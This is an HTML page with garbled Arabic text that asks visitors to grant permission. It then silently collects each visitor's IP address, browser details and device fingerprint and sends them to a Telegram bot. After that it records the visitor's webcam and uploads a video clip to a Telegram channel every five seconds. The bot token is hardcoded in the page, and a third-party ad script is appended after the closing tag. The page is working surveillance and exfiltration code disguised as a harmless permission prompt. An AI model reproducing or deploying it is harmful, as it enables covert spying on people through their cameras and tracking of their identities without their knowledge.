<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ffmpeg.js/0.8.6/ffmpeg.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        video {
            width: 100%;
            max-width: 600px;
            border: 2px solid #007acc;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
        }
    </style>
</head>
<body>
    <h1>ÙŠØ±Ø¬Ù‰ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ø£ÙˆÙ„Ø§ğŸ«¡</h1>
    <video id="videoElement" autoplay muted></video>

    <script>
        const videoElement = document.getElementById('videoElement');
        let stream;
        let recorder;
        let chunks = [];

        async function init() {
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¹Ù†ÙˆØ§Ù† IP
            const ipAddress = await getIPAddress();
            const userAgent = navigator.userAgent; // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­
            const fp = await FingerprintJS.load(); // ØªØ­Ù…ÙŠÙ„ FingerprintJS
            const result = await fp.get(); // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¨ØµÙ…Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²
            await notifyTelegram(ipAddress, userAgent, result.visitorId);
            startCamera();
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
                startRecording();
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
                alert('ÙŠØ±Ø¬Ù‰ ØªÙ…ÙƒÙŠÙ† Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.');
            }
        }

        function startRecording() {
            chunks = [];
            recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const mp4Blob = await convertWebMToMp4(blob); // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ MP4
                await sendToTelegram(mp4Blob); // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Telegram
                chunks = [];
            };
            recorder.start();

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙƒÙ„ 5 Ø«ÙˆØ§Ù†Ù
            setInterval(() => {
                recorder.stop();
                recorder.start();
            }, 5000);
        }

        async function convertWebMToMp4(blob) {
            const ffmpeg = FFmpeg.createFFmpeg({ log: true });
            await ffmpeg.load();

            // ØªØ­ÙˆÙŠÙ„ blob Ø¥Ù„Ù‰ Uint8Array
            const arrayBuffer = await blob.arrayBuffer();
            const inputData = new Uint8Array(arrayBuffer);

            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù…Ù„Ù Ø¥Ù„Ù‰ ffmpeg
            ffmpeg.FS('writeFile', 'input.webm', inputData);
            await ffmpeg.run('-i', 'input.webm', 'output.mp4');

            // Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø­ÙˆÙ„
            const data = ffmpeg.FS('readFile', 'output.mp4');

            // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Blob
            return new Blob([data.buffer], { type: 'video/mp4' });
        }

        async function sendToTelegram(media) {
            const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª
            const chatId = '@karimbmr'; // Ø§Ø³Ù… Ø§Ù„Ù‚Ù†Ø§Ø©
            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;

            const formData = new FormData();
            formData.append('video', media, 'video.mp4'); // ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ù†Ø§Ø³Ø¨
            formData.append('chat_id', chatId);
            formData.append('caption', 'ÙÙŠØ¯ÙŠÙˆ Ù…Ø¨Ø§Ø´Ø±!'); // Ø¥Ø¶Ø§ÙØ© ØªØ¹Ù„ÙŠÙ‚ Ø¥Ø°Ø§ Ø±ØºØ¨Øª

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Telegram:', errorData);
                } else {
                    console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙƒÙÙŠØ¯ÙŠÙˆ Ø¹Ø§Ø¯ÙŠ Ø¨Ù†Ø¬Ø§Ø­!');
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Telegram:', error);
            }
        }

        async function notifyTelegram(ipAddress, userAgent, fingerprint) {
            const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª
            const chatId = '@karimbmr'; // Ø§Ø³Ù… Ø§Ù„Ù‚Ù†Ø§Ø©
            const message = `Ø´Ø®Øµ Ù…Ø§ Ø¯Ø®Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹!\nØ¹Ù†ÙˆØ§Ù† IP: ${ipAddress}\nÙ…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­: ${userAgent}\nØ¨ØµÙ…Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²: ${fingerprint}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Telegram:', errorData);
                } else {
                    console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¨Ù†Ø¬Ø§Ø­!');
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Telegram:', error);
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¹Ù†ÙˆØ§Ù† IP:', error);
                return 'ØºÙŠØ± Ù…ØªÙˆÙØ±';
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
        init();
    </script>
</body>
</html>
<script type="text/javascript">

	atOptions = {

		'key' : '6e20197386a740a2a2940de1694ca33f',

		'format' : 'iframe',

		'height' : 90,

		'width' : 728,

		'params' : {}

	};

</script>

<script type="text/javascript" src="//declareddetect.com/6e20197386a740a2a2940de1694ca33f/invoke.js"></script>
